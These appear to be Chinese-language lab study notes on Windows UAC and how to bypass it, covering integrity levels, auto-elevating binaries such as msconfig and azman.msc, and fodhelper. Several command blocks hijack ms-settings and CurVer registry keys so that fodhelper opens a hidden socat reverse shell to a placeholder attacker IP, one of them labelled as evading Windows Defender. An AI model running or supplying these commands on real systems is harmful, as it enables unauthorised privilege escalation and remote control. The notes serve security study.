# UAC bypass

# 概述

**UAC**（**用户帐户控制），UAC 可以阻止未经授权的应用程序的自动安装，并防止无意更改系统设置。**它是一项 Windows 安全功能，默认情况下强制任何新进程在非特权帐户的安全环境中运行。此策略适用于任何用户（包括管理员自己）启动的进程

[https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/how-user-account-control-works](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/how-user-account-control-works)   #微软的官方对uac的解释

# UAC 提权

管理员需要执行特权任务，UAC提供了一种提升特权的方法。**Elevation**的工作原理是向用户显示一个简单的对话框，以确认他们明确批准在管理安全上下文中运行应用程序

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled.png)

****完整性等级****

它是一种**强制完整性控制 (MIC)，**它是一种通过为每个用户、进程和资源分配一个**Integrity Level (IL)** 来区分用户、进程和资源的机制。在较高的IL情况中，**访问令牌的用户或进程将能够访问具有较低或相等 IL 的资源**。**MIC 优先于常规 Windows DACL**，因此您可能有权根据 DACL 访问资源

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%201.png)

****过滤的令牌****

为了角色分离，UAC用不同方式区分普通用户和管理员

1. **非管理员**在登录时将收到一个访问令牌，该令牌将用于用户执行的所有任务。此令牌具有中等 IL。
2. **管理员**将收到两个访问令牌：
  a. **过滤令牌：**去除管理员权限的令牌，用于常规操作。此令牌具有中等 IL
    
      b. **提升令牌：**具有完全管理员权限的令牌，在需要以管理权限运行某些东西时使用。此令牌具有高 IL
    

# 采用平常的方式来打开应用程序

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%202.png)

**通过Process Hacker 分析进程，确实证明完整性不同，使用普通方式打开的被分配中完整性，使用admin打开的则被分配高完整性**

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%203.png)

# ****UAC的设置****

根据安全要求，UAC会在四个不同的通知级别上运行

1. **始终通知：**在更改 Windows 设置或程序尝试安装应用程序或更改计算机时通知并提示用户授权
2. **仅当程序尝试对我的计算机进行更改时通知我：**当程序尝试安装应用程序或对计算机进行更改时通知并提示用户授权。更改 Windows 设置时不会提示管理员
3.  **仅当程序尝试对我的计算机进行更改时通知我（不要使我的桌面变暗）：**与上述相同，但不会在安全桌面上运行UAC提示。
4.  **从不通知：**禁用UAC提示。管理员将使用高权限令牌运行所有内容。

但默认情况下是采用的**仅当程序尝试更改我的计算机**级别时才在通知我上配置 UAC 

# 绕过UAC

## 概述：

即使我们获得与管理用户的 Powershell 会话，UAC也会阻止我们执行任何管理任务，因为我们目前仅使用过滤令牌。如果我们想完全控制我们的目标，我们必须绕过 UAC。

原理：**High 完整性的父进程创建的任何进程都将继承相同的完整性级别**，因此这足以获得提升的令牌，而无需我们通过UAC提示。

### 基于GUI的绕过

### 案例1：****msconfig****

通过Process Hacker进程分析发现，msconfig是作为高完整性的进程，它具有自动提升的功能。

首先使用msconfig强制生成一个shell，该shell是继承 msconfig 使用的相同访问令牌，所以也为高完整性

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%204.png)

案例2：**azman.msc**

它也是azman.msc 将自动提升而不需要用户交互，通过Process Hacker发现也是生成一个高完整性的进程

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%205.png)

利用方式：是利用该程序的帮助选项。来产生一个记事本进程，然后继承高完整性。

![https://i.imgur.com/4QyoSo0.png](https://i.imgur.com/4QyoSo0.png)

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%206.png)

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%207.png)

## ****自动提升****

概述：一些可执行文件可以自动提升，无需任何用户干预即可实现高完整性。

需要满足要求才可以进行自动提升：

1. 可执行文件必须由 Windows Publisher 签名
2. 可执行文件必须包含在受信任的目录中，例如`%SystemRoot%/System32/`或者`%ProgramFiles%/`

其他要求：

1. 可执行文件 (.exe) 必须在其属性中声明**autoElevate**元素。要检查文件的属性，我们可以使用**[sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck)**

![QjTVYj4BHS.png](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/QjTVYj4BHS.png)

注意： mmc.exe 将根据用户请求的 .msc 管理单元自动提升。Windows 中包含的大多数 .msc 文件都会自动提升。pkgmgr.exe 和 spinstall.exe也可以自动提升。

 [COM 对象还可以通过配置一些注册表项 ( https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker](https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker) )来请求自动提升。

## ****案例研究：Fodhelper****

概述：Fodhelper.exe 是 Windows 默认可执行文件之一，负责管理 Windows 可选功能，包括其他语言、默认未安装的应用程序或其他操作系统特性。它可以在使用默认 UAC 设置时自动提升。

原理：

fodhelper 它会在注册表中搜索感兴趣的特定键。如果在注册表中未配置用户特定关联，则将使用**HKEY_LOCAL_MACHINE (HKLM)处的系统范围关联**。 这样，每个用户都可以根据需要单独选择他们喜欢的应用程序

应用阶段1：

第一条命令：配置注册表中的特定键

第二条命令：设置键中内容

第三条命令：设置了叫**DelegateExecute的空键**

第四条命令：配置此键让cmd运行

```bash
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
```

命令配置完成后，使用fodhelper.exe 就会弹shell过去。

![Untitled](UAC%20bypass%205307d952fb654cccb92781a5e3e961e0/Untitled%208.png)

## 绕过Windows Defender 使用fodhelper 进行bypass UAC

```bash
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

### ****改进 fodhelper 漏洞利用****

它使用了不同的注册表项，但基本原理和上面是相同的

不写入HKCU\Software\Classes\ms-settings\Shell\Open\command 项，而是利用`CurVer`progID注册表项下的条目，当在同一系统上运行具有不同版本的应用程序的多个实例时，将使用此项。

原理概述：

将在注册表中为我们选择的新 progID 创建一个条目（任何名称都可以），然后将 ms-settings progID 中的 CurVer 条目指向我们新创建的 progID。这样，当 fodhelper 尝试使用 ms-settings progID 打开文件时，它会注意到 CurVer 条目指向我们的新 progID 并检查它以查看要使用的命令。

```bash
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe
```

## ****绕过总是通知****

### ****案例研究：磁盘清理计划任务****

## ****自动化UAC绕过****

通过 [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME) 项目中的 

# 更多UAC技术

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

[https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)

[https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/](https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/)

[https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)

[https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/](https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/)